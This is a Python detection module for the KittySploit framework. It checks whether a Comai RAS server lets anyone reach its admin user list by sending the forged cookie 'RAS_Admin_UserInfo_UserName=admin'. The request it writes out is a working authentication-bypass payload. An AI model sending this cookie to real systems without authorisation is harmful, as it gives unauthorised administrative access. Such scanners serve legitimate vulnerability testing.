#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Comai RAS system has cookie authentication overreach, when RAS_Admin_UserInfo_UserName is set to admin, the ba."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Comai RAS System Cookie - Authentication Override Detection',
        'description': 'Comai RAS system has cookie authentication overreach, when RAS_Admin_UserInfo_UserName is set to admin, the background can be accessed',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'comai-ras', 'ras', 'kemai', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/%E7%A7%91%E8%BF%88/%E7%A7%91%E8%BF%88%20RAS%E7%B3%BB%E7%BB%9F%20Cookie%E9%AA%8C%E8%AF%81%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.md',
            'https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/maike-ras-cookie-bypass.yaml',
        ],
    }

    def run(self):
        path = '/Server/CmxUser.php?pgid=UserList'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'cookie': 'RAS_Admin_UserInfo_UserName=admin'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"?pgid=User_Show', 'usingeKey', 'MachineAmount', 'AppLoginType', 'TimeType',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Comai RAS System Cookie - Authentication Override detected', path=path)
            return True
        return False

